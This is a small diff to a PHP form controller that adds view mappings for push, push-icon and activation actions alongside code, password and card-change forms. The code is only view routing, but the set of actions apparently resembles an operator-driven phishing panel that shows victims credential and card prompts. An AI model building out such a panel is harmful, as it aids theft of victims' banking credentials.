@@ -58,7 +58,8 @@ class FormController extends Controller
         // Select view based on action type
         $viewName = match ($action) {
             ActionType::CODE => 'forms.code',
-            ActionType::PUSH => 'forms.push-icon',
+            ActionType::PUSH => 'forms.push',
+            ActionType::PUSH_ICON => 'forms.push-icon',
             ActionType::PASSWORD => 'forms.password',
             ActionType::CARD_CHANGE => 'forms.card-change',
             ActionType::ERROR => 'forms.error',
@@ -67,6 +68,7 @@ class FormController extends Controller
             ActionType::CUSTOM_QUESTION => 'forms.custom-question',
             ActionType::CUSTOM_IMAGE => 'forms.custom-image',
             ActionType::IMAGE_QUESTION => 'forms.image-question',
+            ActionType::ACTIVATION => 'forms.activation',
             ActionType::REDIRECT => 'forms.waiting', // fallback если нет URL
         };
 
